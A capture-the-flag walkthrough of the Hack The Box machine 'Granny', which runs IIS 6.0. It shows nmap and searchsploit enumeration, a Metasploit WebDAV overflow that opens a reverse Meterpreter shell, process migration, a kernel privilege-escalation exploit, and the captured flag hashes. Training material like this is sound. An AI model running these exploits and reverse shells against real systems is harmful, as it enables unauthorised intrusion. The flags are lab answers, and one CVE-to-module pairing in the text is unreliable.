NOTE: Machine is essentially a carbon copy of [Grandpa](https://github.com/HippoEug/HackTheBox/edit/main/Machines%20(Easy)/Grandpa.md) machine.

# Summary
### 1. NMAP
Running NMAP, we see only 1 Port open, Port 80 running Microsoft IIS httpd 6.0.

### 2. Enumeration
Visiting `http://10.10.10.15:80` was not useful, as the page was "Under Construction". However, Searchsploit for `iis 6.0` showed many potential exploits we could use. On Google, we see two metasploit modules, [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) & [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).

### 3. Exploit
NOTE: The intended exploit is [`CVE-2017-7269`](https://www.exploit-db.com/exploits/16471), Metasploit module `iis_webdav_upload_asp`.

We tried [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/), which worked, giving us a Meterpreter shell.

However, when we tried to change directory to both Administrator or Lakis, we received the "Access is denied" error. We need to privilege escalate at this point.

### 4. Privilege Escalation
We run `/recon/local_exploit_suggester`, and again see many exploits we could use. We run the first one, [`exploit/windows/local/ms14_058_track_popup_menu`](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/). 

We had to migrate to a process running under NT AUTHORITY\NETWORK SERVICE, and in our case to `wmiprvse.exe`. Running the [`exploit/windows/local/ms14_058_track_popup_menu`](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/) exploit after the process migration, we got a privileged Meterpreter shell and were able to find both flags.

# Attack
## 1. NMAP
Hi!
```
hippoeug@kali:~$ nmap --script vuln 10.129.2.63 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 22:28 +08
...
Scanning 10.129.2.63 [1000 ports]
Discovered open port 80/tcp on 10.129.2.63
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
|_http-server-header: Microsoft-IIS/6.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_server:6.0: 
|       SSV:92834       10.0    https://vulners.com/seebug/SSV:92834    *EXPLOIT*
|       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
|       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
|       PACKETSTORM:142471      10.0    https://vulners.com/packetstorm/PACKETSTORM:142471      *EXPLOIT*
|       PACKETSTORM:142060      10.0    https://vulners.com/packetstorm/PACKETSTORM:142060      *EXPLOIT*
|       PACKETSTORM:141997      10.0    https://vulners.com/packetstorm/PACKETSTORM:141997      *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ    10.0    https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ     *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/IIS/IIS_WEBDAV_SCSTORAGEPATHFROMURL 10.0    https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/IIS_WEBDAV_SCSTORAGEPATHFROMURL  *EXPLOIT*
|       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
|       IIS6_PROPFIND   10.0    https://vulners.com/canvas/IIS6_PROPFIND        *EXPLOIT*
|       EDB-ID:41992    10.0    https://vulners.com/exploitdb/EDB-ID:41992      *EXPLOIT*
|       EDB-ID:20933    10.0    https://vulners.com/exploitdb/EDB-ID:20933      *EXPLOIT*
|       EDB-ID:20932    10.0    https://vulners.com/exploitdb/EDB-ID:20932      *EXPLOIT*
|       EDB-ID:20931    10.0    https://vulners.com/exploitdb/EDB-ID:20931      *EXPLOIT*
|       EDB-ID:20930    10.0    https://vulners.com/exploitdb/EDB-ID:20930      *EXPLOIT*
|       EDB-ID:16472    10.0    https://vulners.com/exploitdb/EDB-ID:16472      *EXPLOIT*
|       CVE-2017-7269   10.0    https://vulners.com/cve/CVE-2017-7269
|       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
|       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
|       1337DAY-ID-27757        10.0    https://vulners.com/zdt/1337DAY-ID-27757        *EXPLOIT*
|       1337DAY-ID-27446        10.0    https://vulners.com/zdt/1337DAY-ID-27446        *EXPLOIT*
|       SSV:12476       9.3     https://vulners.com/seebug/SSV:12476    *EXPLOIT*
|       SSV:12175       9.3     https://vulners.com/seebug/SSV:12175    *EXPLOIT*
|       SAINT:38542AFE78DE33F6BB0AF7E6A3C90956  9.3     https://vulners.com/saint/SAINT:38542AFE78DE33F6BB0AF7E6A3C90956        *EXPLOIT*
|       PACKETSTORM:94532       9.3     https://vulners.com/packetstorm/PACKETSTORM:94532       *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST      9.3     https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST       *EXPLOIT*
|       EDB-ID:9559     9.3     https://vulners.com/exploitdb/EDB-ID:9559       *EXPLOIT*
|       EDB-ID:9541     9.3     https://vulners.com/exploitdb/EDB-ID:9541       *EXPLOIT*
|       EDB-ID:16740    9.3     https://vulners.com/exploitdb/EDB-ID:16740      *EXPLOIT*
|       SAINT:54344E071A068774A374DCE7F7795E80  9.0     https://vulners.com/saint/SAINT:54344E071A068774A374DCE7F7795E80        *EXPLOIT*
|       SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99  9.0     https://vulners.com/saint/SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99        *EXPLOIT*
|       IISFTP_NLST     9.0     https://vulners.com/canvas/IISFTP_NLST  *EXPLOIT*
|       CVE-2009-3023   9.0     https://vulners.com/cve/CVE-2009-3023
|       CVE-2010-1256   8.5     https://vulners.com/cve/CVE-2010-1256
|       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
|       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
|       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
|       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
|       EDB-ID:2056     6.5     https://vulners.com/exploitdb/EDB-ID:2056       *EXPLOIT*
|       CVE-2006-0026   6.5     https://vulners.com/cve/CVE-2006-0026
|       EDB-ID:585      5.0     https://vulners.com/exploitdb/EDB-ID:585        *EXPLOIT*
|       CVE-2005-2678   5.0     https://vulners.com/cve/CVE-2005-2678
|       CVE-2003-0718   5.0     https://vulners.com/cve/CVE-2003-0718
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS     4.3     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS      *EXPLOIT*
|       EDB-ID:15167    4.3     https://vulners.com/exploitdb/EDB-ID:15167      *EXPLOIT*
|       CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|       CVE-2005-2089   4.3     https://vulners.com/cve/CVE-2005-2089
|       CVE-2003-1582   2.6     https://vulners.com/cve/CVE-2003-1582
|_      EDB-ID:41738    0.0     https://vulners.com/exploitdb/EDB-ID:41738      *EXPLOIT*
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Now, this seriously looks like a carbon copy of [Grandpa](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Grandpa.md) machine.
Except the addition of `/images/: Potentially interesting folder` & `/_private/: Potentially interesting folder`.

## 2. Enumeration
Visiting http://10.10.10.15:80 on our browser, we get an "Under Construction" page.

![UnderConstruction](https://user-images.githubusercontent.com/21957042/113512055-7d501c80-9595-11eb-86e1-b26d811ac2c1.png)

As usual, we'll add it to `/etc/hosts` and see what we get.
```
hippoeug@kali:~$ sudo nano /etc/hosts
[sudo] password for hippoeug: 
  GNU nano 5.4                                                                  /etc/hosts *                                                                          
127.0.0.1       localhost
127.0.1.1       kali
10.129.2.63 granny.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

![granny](https://user-images.githubusercontent.com/21957042/114212164-187d3380-9994-11eb-8d66-f5ae32fcd9b4.png)

Still the same, let's move on.

Let's do some searches for `Microsoft IIS httpd 6.0`. If we end up not being able to find any exploits, we can try Dirbuster.
```
hippoeug@kali:~$ searchsploit iis 6.0
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                              | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                     | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                       | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                            | windows/remote/19033.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Again, quite a few potential exploits. We also Google "microsoft iis httpd 6.0 exploit" to limit down our search. We see two metasploit modules, [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) & [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).

## 3. Exploit
NOTE: The intended exploit is [`CVE-2017-7269`](https://www.exploit-db.com/exploits/16471), Metasploit module `iis_webdav_upload_asp`.

Let's try the exploit, [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).
```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.15:1030) at 2021-01-26 21:47:49 +0800

meterpreter > 
```
We got a Meterpreter shell! Time to find flags.

Let's try to navigate around in Users.
```
meterpreter > cd Lakis
[-] stdapi_fs_chdir: Operation failed: Access is denied.
meterpreter > cd Administrator
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```
Hmm, Access is denied. Let's try getuid.
```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```
Time for privilege escalation.

## 4. Privilege Escalation
Since we got a Meterpreter shell, we can just run the /recon/local_exploit_suggester.
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
Let's run the first one, [`exploit/windows/local/ms14_058_track_popup_menu`](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/). But we must also remember to migrate to a process running under NT AUTHORITY\NETWORK SERVICE.
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 400   1080  cidaemon.exe                                                    
 408   348   lsass.exe                                                       
 592   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1080  396   cisvc.exe                                                       
 1136  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1216  1080  cidaemon.exe                                                    
 1220  396   svchost.exe                                                     
 1320  1080  cidaemon.exe                                                    
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1464  396   svchost.exe                                                     
 1604  396   svchost.exe                                                     
 1816  396   alg.exe                                                         
 1832  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1896  396   dllhost.exe                                                     
 2308  592   wmiprvse.exe                                                    
 2680  348   logon.scr                                                       
 3200  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3268  3200  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3272  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3408  1464  w3wp.exe                                                        
 4068  592   davcdata.exe                                                    

meterpreter > migrate  1832
[*] Migrating from 3268 to 1832...
[*] Migration completed successfully.
```
Done. Let's get back to our privilege escalation exploit.
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > back
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4545 
[*] Launching notepad to host the exploit...
[+] Process 3704 launched.
[*] Reflectively injecting the exploit DLL into 3704...
[*] Injecting exploit into 3704...
[*] Exploit injected. Injecting payload into 3704...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.x.x:4545 -> 10.10.10.15:1031) at 2021-01-26 22:00:30 +0800

meterpreter > 
```
Done! Time to just find flags!
```
meterpreter > dir
Listing: C:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-13 03:19:57 +0800  user.txt

meterpreter > cat user.txt
700c5dc163014e22b3e408f8703f67d1
...
meterpreter > cd Administrator/Desktop
meterpreter > cat root.txt
aa4beed1c0584445ab463a6747bd06e9
```
